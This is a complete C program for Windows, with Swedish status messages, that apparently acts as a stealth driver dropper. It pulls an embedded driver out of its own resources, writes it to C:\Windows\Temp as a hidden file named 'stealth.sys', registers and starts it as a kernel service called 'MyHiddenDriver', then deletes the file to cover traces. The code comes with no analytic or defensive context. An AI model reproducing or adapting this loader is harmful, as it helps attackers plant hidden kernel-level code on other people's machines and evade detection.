#include <windows.h>
#include <stdio.h>

#define DRIVER_NAME "MyHiddenDriver"
#define DRIVER_PATH "C:\\Windows\\Temp\\stealth.sys"

void WriteDriverFromResource() {
    HRSRC hRes = FindResource(NULL, "driver", RT_RCDATA);
    if (!hRes) {
        printf("Kunde inte hitta resursen!\n");
        return;
    }
    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (!hResLoad) {
        printf("Kunde inte ladda resursen!\n");
        return;
    }
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pDriver = LockResource(hResLoad);
    if (!pDriver) {
        printf("Kunde inte låsa resursen!\n");
        return;
    }

    HANDLE hFile = CreateFileA(DRIVER_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Kunde inte skapa filen %s\n", DRIVER_PATH);
        return;
    }

    DWORD written;
    if (!WriteFile(hFile, pDriver, size, &written, NULL) || written != size) {
        printf("Misslyckades skriva drivrutinen till disk!\n");
        CloseHandle(hFile);
        return;
    }
    CloseHandle(hFile);
    printf("Drivrutinen sparad till %s\n", DRIVER_PATH);
}

void LoadDriver() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        printf("Misslyckades öppna SCM (%lu)\n", GetLastError());
        return;
    }

    SC_HANDLE hService = CreateServiceA(
        hSCM, DRIVER_NAME, DRIVER_NAME,
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        DRIVER_PATH,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, DRIVER_NAME, SERVICE_START);
            if (!hService) {
                printf("Misslyckades öppna tjänst (%lu)\n", GetLastError());
                CloseServiceHandle(hSCM);
                return;
            }
        }
        else {
            printf("Misslyckades skapa tjänst (%lu)\n", err);
            CloseServiceHandle(hSCM);
            return;
        }
    }

    if (!StartService(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("Misslyckades starta tjänst (%lu)\n", err);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return;
        }
    }
    printf("Drivrutin laddad.\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
}

void Cleanup() {
    if (!DeleteFileA(DRIVER_PATH)) {
        printf("Misslyckades radera drivrutinen (%lu)\n", GetLastError());
    }
    else {
        printf("Drivrutin raderad.\n");
    }
}

int main() {
    WriteDriverFromResource();
    LoadDriver();
    Cleanup();
    return 0;
}
